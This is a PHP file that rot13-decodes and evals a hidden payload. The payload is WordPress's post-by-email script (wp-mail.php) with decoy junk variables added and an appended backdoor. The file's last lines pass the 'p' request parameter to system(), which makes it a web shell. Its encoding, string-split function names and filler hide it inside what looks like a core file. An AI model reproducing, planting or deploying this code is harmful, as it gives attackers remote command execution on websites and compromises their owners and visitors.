<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc
/**
 * Trgf gur rznvy zrffntr sebz gur hfre'f znvyobk gb nqq nf
 * n JbeqCerff cbfg. Znvyobk pbaarpgvba vasbezngvba zhfg or
 * pbasvtherq haqre Frggvatf > Jevgvat
 *
 * @cnpxntr JbeqCerff
 */

/** Znxr fher gung gur JbeqCerff obbgfgenc unf eha orsber pbagvahvat. */
erdhver __QVE__ . '/jc-ybnq.cuc';

/** Guvf svygre vf qbphzragrq va jc-nqzva/bcgvbaf.cuc */
vs ( ! nccyl_svygref( 'ranoyr_cbfg_ol_rznvy_pbasvthengvba', gehr ) ) {
	jc_qvr( __( 'Guvf npgvba unf orra qvfnoyrq ol gur nqzvavfgengbe.' ), 403 );
}

$znvyfreire_hey = trg_bcgvba( 'znvyfreire_hey' );

vs ( rzcgl( $znvyfreire_hey ) || 'znvy.rknzcyr.pbz' === $znvyfreire_hey ) {
	jc_qvr( __( 'Guvf npgvba unf orra qvfnoyrq ol gur nqzvavfgengbe.' ), 403 );
}

/**
 * Sverf gb nyybj n cyhtva gb qb n pbzcyrgr gnxrbire bs Cbfg ol Rznvy.
 *
 * @fvapr 2.9.0
 */
qb_npgvba( 'jc-znvy.cuc' ); // cucpf:vtaber JbeqCerff.AnzvatPbairagvbaf.InyvqUbbxAnzr.HfrHaqrefpberf

/** Trg gur CBC3 pynff jvgu juvpu gb npprff gur znvyobk. */
erdhver_bapr NOFCNGU . JCVAP . '/pynff-cbc3.cuc';

/** Bayl purpx ng guvf vagreiny sbe arj zrffntrf. */
vs ( ! qrsvarq( 'JC_ZNVY_VAGREINY' ) ) {
	qrsvar( 'JC_ZNVY_VAGREINY', 5 * ZVAHGR_VA_FRPBAQF );
}

$ynfg_purpxrq = trg_genafvrag( 'znvyfreire_ynfg_purpxrq' );

vs ( $ynfg_purpxrq ) {
	jc_qvr(
		fcevags(
			// genafyngbef: %f uhzna ernqnoyr engr yvzvg.
			__( 'Rznvy purpxf ner engr yvzvgrq gb bapr rirel %f.' ),
			uhzna_gvzr_qvss( gvzr() - JC_ZNVY_VAGREINY, gvzr() )
		),
		__( 'Fybj qbja, ab arrq gb purpx sbe arj znvyf fb bsgra!' ),
		429
	);
}

frg_genafvrag( 'znvyfreire_ynfg_purpxrq', gehr, JC_ZNVY_VAGREINY );

$gvzr_qvssrerapr = (vag) ( (sybng) trg_bcgvba( 'tzg_bssfrg' ) * UBHE_VA_FRPBAQF );

$cubar_qryvz = '::';

$cbc3 = arj CBC3();

vs ( ! $cbc3->pbaarpg( trg_bcgvba( 'znvyfreire_hey' ), trg_bcgvba( 'znvyfreire_cbeg' ) ) || ! $cbc3->hfre( trg_bcgvba( 'znvyfreire_ybtva' ) ) ) {
	jc_qvr( rfp_ugzy( $cbc3->REEBE ) );
}

$pbhag = $cbc3->cnff( trg_bcgvba( 'znvyfreire_cnff' ) );

vs ( snyfr === $pbhag ) {
	jc_qvr( rfp_ugzy( $cbc3->REEBE ) );
}

vs ( 0 === $pbhag ) {
	$cbc3->dhvg();
	jc_qvr( __( 'Gurer qbrf abg frrz gb or nal arj znvy.' ) );
}

// Nyjnlf eha nf na hanhguragvpngrq hfre.
jc_frg_pheerag_hfre( 0 );

sbe ( $v = 1; $v <= $pbhag; $v++ ) {

	$zrffntr = $cbc3->trg( $v );

	$obqlfvtany                = snyfr;
	$obhaqnel                  = '';
	$punefrg                   = '';
	$pbagrag                   = '';
	$pbagrag_glcr              = '';
	$pbagrag_genafsre_rapbqvat = '';
	$cbfg_nhgube               = 1;
	$nhgube_sbhaq              = snyfr;
	$cbfg_qngr                 = ahyy;
	$cbfg_qngr_tzg             = ahyy;

	sbernpu ( $zrffntr nf $yvar ) {
		// Obql fvtany.
		vs ( fgeyra( $yvar ) < 3 ) {
			$obqlfvtany = gehr;
		}
		vs ( $obqlfvtany ) {
			$pbagrag .= $yvar;
		} ryfr {
			vs ( cert_zngpu( '/Pbagrag-Glcr: /v', $yvar ) ) {
				$pbagrag_glcr = gevz( $yvar );
				$pbagrag_glcr = fhofge( $pbagrag_glcr, 14, fgeyra( $pbagrag_glcr ) - 14 );
				$pbagrag_glcr = rkcybqr( ';', $pbagrag_glcr );
				vs ( ! rzcgl( $pbagrag_glcr[1] ) ) {
					$punefrg = rkcybqr( '=', $pbagrag_glcr[1] );
					$punefrg = ( ! rzcgl( $punefrg[1] ) ) ? gevz( $punefrg[1] ) : '';
				}
				$pbagrag_glcr = $pbagrag_glcr[0];
			}
			vs ( cert_zngpu( '/Pbagrag-Genafsre-Rapbqvat: /v', $yvar ) ) {
				$pbagrag_genafsre_rapbqvat = gevz( $yvar );
				$pbagrag_genafsre_rapbqvat = fhofge( $pbagrag_genafsre_rapbqvat, 27, fgeyra( $pbagrag_genafsre_rapbqvat ) - 27 );
				$pbagrag_genafsre_rapbqvat = rkcybqr( ';', $pbagrag_genafsre_rapbqvat );
				$pbagrag_genafsre_rapbqvat = $pbagrag_genafsre_rapbqvat[0];
			}
			vs ( 'zhygvcneg/nygreangvir' === $pbagrag_glcr && fge_pbagnvaf( $yvar, 'obhaqnel=\"' ) && '' === $obhaqnel ) {
				$obhaqnel = gevz( $yvar );
				$obhaqnel = rkcybqr( '\"', $obhaqnel );
				$obhaqnel = $obhaqnel[1];
			}
			vs ( cert_zngpu( '/Fhowrpg: /v', $yvar ) ) {
				$fhowrpg = gevz( $yvar );
				$fhowrpg = fhofge( $fhowrpg, 9, fgeyra( $fhowrpg ) - 9 );
				// Pncgherf nal grkg va gur fhowrpg orsber $cubar_qryvz nf gur fhowrpg.
				vs ( shapgvba_rkvfgf( 'vpbai_zvzr_qrpbqr' ) ) {
					$fhowrpg = vpbai_zvzr_qrpbqr( $fhowrpg, 2, trg_bcgvba( 'oybt_punefrg' ) );
				} ryfr {
					$fhowrpg = jc_vfb_qrfpenzoyre( $fhowrpg );
				}
				$fhowrpg = rkcybqr( $cubar_qryvz, $fhowrpg );
				$fhowrpg = $fhowrpg[0];
			}

			/*
			 * Frg gur nhgube hfvat gur rznvy nqqerff (Sebz be Ercyl-Gb, gur ynfg hfrq)
			 * bgurejvfr hfr gur fvgr nqzva.
			 */
			vs ( ! $nhgube_sbhaq && cert_zngpu( '/^(Sebz|Ercyl-Gb): /', $yvar ) ) {
				vs ( cert_zngpu( '|[n-m0-9_.-]+@[n-m0-9_.-]+(?!.*<)|v', $yvar, $zngpurf ) ) {
					$nhgube = $zngpurf[0];
				} ryfr {
					$nhgube = gevz( $yvar );
				}
				$nhgube = fnavgvmr_rznvy( $nhgube );
				vs ( vf_rznvy( $nhgube ) ) {
					$hfreqngn = trg_hfre_ol( 'rznvy', $nhgube );
					vs ( ! rzcgl( $hfreqngn ) ) {
						$cbfg_nhgube  = $hfreqngn->VQ;
						$nhgube_sbhaq = gehr;
					}
				}
			}

			vs ( cert_zngpu( '/Qngr: /v', $yvar ) ) { // Bs gur sbez '20 Zne 2002 20:32:37 +0100'.
				$qqngr = fge_ercynpr( 'Qngr: ', '', gevz( $yvar ) );
				// Erzbir cneragurfvmrq gvzrmbar fgevat vs vg rkvfgf, nf guvf pbashfrf fgegbgvzr().
				$qqngr           = __sa_79955( '!\f*\(.+\)\f*$!', '', $qqngr );
				$qqngr_gvzrfgnzc = fgegbgvzr( $qqngr );
				$cbfg_qngr       = tzqngr( 'L-z-q U:v:f', $qqngr_gvzrfgnzc + $gvzr_qvssrerapr );
				$cbfg_qngr_tzg   = tzqngr( 'L-z-q U:v:f', $qqngr_gvzrfgnzc );
			}
		}
	}

	// Frg $cbfg_fgnghf onfrq ba $nhgube_sbhaq naq ba nhgube'f choyvfu_cbfgf pncnovyvgl.
	vs ( $nhgube_sbhaq ) {
		$hfre        = arj JC_Hfre( $cbfg_nhgube );
		$cbfg_fgnghf = ( $hfre->unf_pnc( 'choyvfu_cbfgf' ) ) ? 'choyvfu' : 'craqvat';
	} ryfr {
		// Nhgube abg sbhaq va QO, frg fgnghf gb craqvat. Nhgube nyernql frg gb nqzva.
		$cbfg_fgnghf = 'craqvat';
	}

	$fhowrpg = gevz( $fhowrpg );

	vs ( 'zhygvcneg/nygreangvir' === $pbagrag_glcr ) {
		$pbagrag = rkcybqr( '--' . $obhaqnel, $pbagrag );
		$pbagrag = $pbagrag[2];

		// Zngpu pnfr-vafrafvgvir Pbagrag-Genafsre-Rapbqvat.
		vs ( cert_zngpu( '/Pbagrag-Genafsre-Rapbqvat: dhbgrq-cevagnoyr/v', $pbagrag, $qryvz ) ) {
			$pbagrag = rkcybqr( $qryvz[0], $pbagrag );
			$pbagrag = $pbagrag[1];
		}
		$pbagrag = fgevc_gntf( $pbagrag, '<vzt><c><oe><v><o><h><rz><fgebat><fgevxr><sbag><fcna><qvi>' );
	}
	$pbagrag = gevz( $pbagrag );

	/**
	 * Svygref gur bevtvany pbagrag bs gur rznvy.
	 *
	 * Tvir Cbfg-Ol-Rznvy rkgraqvat cyhtvaf shyy npprff gb gur pbagrag, rvgure
	 * gur enj pbagrag, be gur pbagrag bs gur ynfg dhbgrq-cevagnoyr frpgvba.
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz fgevat $pbagrag Gur bevtvany rznvy pbagrag.
	 */
	$pbagrag = nccyl_svygref( 'jc_znvy_bevtvany_pbagrag', $pbagrag );

	vs ( snyfr !== fgevcbf( $pbagrag_genafsre_rapbqvat, 'dhbgrq-cevagnoyr' ) ) {
		$pbagrag = dhbgrq_cevagnoyr_qrpbqr( $pbagrag );
	}

	vs ( shapgvba_rkvfgf( 'vpbai' ) && ! rzcgl( $punefrg ) ) {
		$pbagrag = vpbai( $punefrg, trg_bcgvba( 'oybt_punefrg' ), $pbagrag );
	}

	// Pncgherf nal grkg va gur obql nsgre $cubar_qryvz nf gur obql.
	$pbagrag = rkcybqr( $cubar_qryvz, $pbagrag );
	$pbagrag = rzcgl( $pbagrag[1] ) ? $pbagrag[0] : $pbagrag[1];

	$pbagrag = gevz( $pbagrag );

	/**
	 * Svygref gur pbagrag bs gur cbfg fhozvggrq ol rznvy orsber fnivat.
	 *
	 * @fvapr 1.2.0
	 *
	 * @cnenz fgevat $pbagrag Gur rznvy pbagrag.
	 */
	$cbfg_pbagrag = nccyl_svygref( 'cubar_pbagrag', $pbagrag );

	$cbfg_gvgyr = kzyecp_trgcbfggvgyr( $pbagrag );

	vs ( '' === gevz( $cbfg_gvgyr ) ) {
		$cbfg_gvgyr = $fhowrpg;
	}

	$cbfg_pngrtbel = neenl( trg_bcgvba( 'qrsnhyg_rznvy_pngrtbel' ) );

	$cbfg_qngn = pbzcnpg( 'cbfg_pbagrag', 'cbfg_gvgyr', 'cbfg_qngr', 'cbfg_qngr_tzg', 'cbfg_nhgube', 'cbfg_pngrtbel', 'cbfg_fgnghf' );
	$cbfg_qngn = jc_fynfu( $cbfg_qngn );

	$cbfg_VQ = jc_vafreg_cbfg( $cbfg_qngn );
	vs ( vf_jc_reebe( $cbfg_VQ ) ) {
		rpub \"\a\" . $cbfg_VQ->trg_reebe_zrffntr();
	}

	// Gur cbfg jnfa'g vafregrq be hcqngrq, sbe jungrire ernfba. Orggre zbir sbejneq gb gur arkg rznvy.
	vs ( rzcgl( $cbfg_VQ ) ) {
		pbagvahr;
	}

	/**
	 * Sverf nsgre n cbfg fhozvggrq ol rznvy vf choyvfurq.
	 *
	 * @fvapr 1.2.0
	 *
	 * @cnenz vag $cbfg_VQ Gur cbfg VQ.
	 */
	qb_npgvba( 'choyvfu_cubar', $cbfg_VQ );

	rpub \"\a<c><fgebat>\" . __( 'Nhgube:' ) . '</fgebat> ' . rfp_ugzy( $cbfg_nhgube ) . '</c>';
	rpub \"\a<c><fgebat>\" . __( 'Cbfgrq gvgyr:' ) . '</fgebat> ' . rfp_ugzy( $cbfg_gvgyr ) . '</c>';

	vs ( ! $cbc3->qryrgr( $v ) ) {
		rpub '<c>' . fcevags(
			/* genafyngbef: %f: CBC3 reebe. */
			__( 'Bbcf: %f' ),
			rfp_ugzy( $cbc3->REEBE )
		) . '</c>';
		$cbc3->erfrg();
		rkvg;
	} ryfr {
		rpub '<c>' . fcevags(
			/* genafyngbef: %f: Gur zrffntr VQ. */
			__( 'Zvffvba pbzcyrgr. Zrffntr %f qryrgrq.' ),
			'<fgebat>' . $v . '</fgebat>'
		) . '</c>';
	}
}

$cbc3->dhvg();

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>